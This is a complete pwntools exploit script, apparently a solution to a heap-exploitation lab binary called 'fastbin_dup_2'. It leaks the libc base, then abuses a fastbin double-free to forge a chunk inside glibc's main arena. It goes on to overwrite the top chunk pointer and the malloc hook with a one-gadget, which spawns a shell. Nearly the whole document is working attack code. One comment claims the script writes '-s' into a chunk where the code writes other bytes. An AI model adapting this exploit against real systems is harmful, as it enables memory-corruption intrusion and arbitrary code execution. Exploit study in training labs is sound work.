#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- CRAFT A FAKE CHUNK IN THE MAIN ARENA -=-=-=

# Request two chunks with size 0x50.
# The "dup" chunk will be duplicated, the "safety" chunk is used to bypass the fastbins double-free mitigation.
dup = malloc(0x48, "A"*8)
safety = malloc(0x48, "B"*8)

# Use the double-free bug to free the "dup" chunk, then the "safety" chunk, then the "dup" chunk again.
# This way the "dup" chunk is not at the head of the 0x50 fastbin when it is freed for the second time,
# bypassing the fastbins double-free mitigation.
free(dup)
free(safety)
free(dup)

# The next request for a 0x50-sized chunk will be serviced by the "dup" chunk.
# Request it, then overwrite its fastbin fd with a fake 0x60 size field.
malloc(0x48, p64(0x61))

# Make two more requests for 0x50-sized chunks. The "safety" chunk, then the "dup" chunk are allocated to
# service these requests. This has the effect of writing the fake 0x60 size field into the main arena
# in the 0x50 fastbin slot.
malloc(0x48, "C"*8)
malloc(0x48, "D"*8)


# =-=-=- LINK THE FAKE MAIN ARENA CHUNK INTO THE 0x60 FASTBIN -=-=-=

# Request two chunks with size 0x60, duplicate the first of these.
dup = malloc(0x58, "E"*8)
safety = malloc(0x58, "F"*8)

free(dup)
free(safety)
free(dup)

# Overwrite the 0x60 "dup" chunk's fd with the address of the fake chunk in the main arena.
malloc(0x58, p64(libc.sym.main_arena + 0x20))

# Make two more requests for 0x60-sized chunks. The "safety" chunk, then the "dup" chunk are allocated to
# service these requests. Write the string "-s" into the first of these, it will occupy argv[1] during
# one-gadget execution.
malloc(0x58, "F"*8)
malloc(0x58, "G"*8)


# =-=-=- OVERWRITE THE TOP CHUNK POINTER -=-=-=

# The next request for a 0x60-sized chunk is serviced by the fake chunk in the main arena.
# Use it to overwrite the top chunk pointer with the address of the malloc hook - 0x24.
# This ensures there is a sane top chunk size field at the new top chunk address, satisfying the
# GLIBC 2.29 top chunk size field integrity check.
malloc(0x58, p64(0)*6 + p64(libc.sym.__malloc_hook - 0x24))


# =-=-=- OVERWRITE THE MALLOC HOOK -=-=-=

# Make a request that will be serviced from the corrupted top chunk, this chunk will overlap the malloc hook.
# Overwrite the malloc hook with the address of a one-gadget.
malloc(0x28, p8(0)*0x14 + p64(libc.address + 0xe1fa1)) # [rsp+0x50] == NULL

# The next call to malloc() will instead call the one-gadget and drop a shell.
# The argument to malloc() is irrelevant, as long as it passes the program's size check.
# The "-s" option at argv[1] will inhibit further argument parsing by dash.
malloc(0x18, "")

# =============================================================================

io.interactive()
